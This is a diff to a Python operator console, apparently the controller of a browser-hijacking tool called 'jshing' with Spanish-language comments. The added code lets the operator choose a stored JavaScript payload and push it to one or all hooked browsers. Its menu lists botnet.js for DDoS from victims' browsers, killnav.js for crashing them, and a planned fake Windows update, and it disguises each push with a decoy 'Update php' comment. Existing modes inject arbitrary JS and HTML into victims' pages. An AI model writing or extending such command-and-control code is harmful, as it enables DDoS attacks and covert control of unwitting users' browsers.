@@ -1,8 +1,32 @@
 import server.bdd as bdd
-import base64, json, requests
+import base64, json, requests, os, re
 import modules.config as cfg
 
 from modules.utils_jshing import cursor, print_ident, honey_connected
+
+def __payload_select__() -> str:
+
+    patron = r":: .* ::"
+
+    print("""
+>> botnet.js    Encargado de realizar DDoS desde navegadores que contengan este jshing.js.
+>> killnav.js   Carga encargada de crashear y reiniciar el navegador cliente.
+>> fakeupdt.js  Envia una falsa actualizacion de Windows [AUN NO DISPONIBLE]
+    """)
+
+    payload_file = input(cursor() + ":: PAYLOAD :: ")
+
+    with open(f"assets/{payload_file}", "r", encoding="UTF-8") as rf:
+ 
+        payload_buffer = rf.read()
+        personalizar_payload_obj = list(re.findall(patron, payload_buffer))
+
+    for parametro in personalizar_payload_obj:
+
+        person = input(cursor() + parametro + " ")
+        payload_buffer = payload_buffer.replace(parametro, person)
+
+    return payload_buffer
 
 def get_users():
     
@@ -42,9 +66,11 @@ def get_info():
 
 def control_user():
     
+    print("[-] Para cargar un payload para todos los usuarios usa el UUID_M 'all'")
     uuid_m = input(cursor() + ":: UUID_M :: ")
 
     print("""
+>> payload      Usa payloads preinstalados para llegar y cargar.
 >> js_console   Unicamente ejecutara scripts escritos en JS.
 >> html_inyect  Unicamente ejecutara codigo HTML, tambien JS desde etiquetas como onclick, onload, etc.
 >> all          Usa una combinacion de ambos.
@@ -70,6 +96,11 @@ def control_user():
 
             data["html_payload"] = input(cursor() + ":: HTML PAYLOAD :: ")
             data["jscr_payload"] = "// cracked by paap_69"
+
+        elif control_mode == "payload":
+
+            data["html_payload"] = "<!-- Update php to 7.9 -->"
+            data["jscr_payload"] = __payload_select__()
 
         else:
 
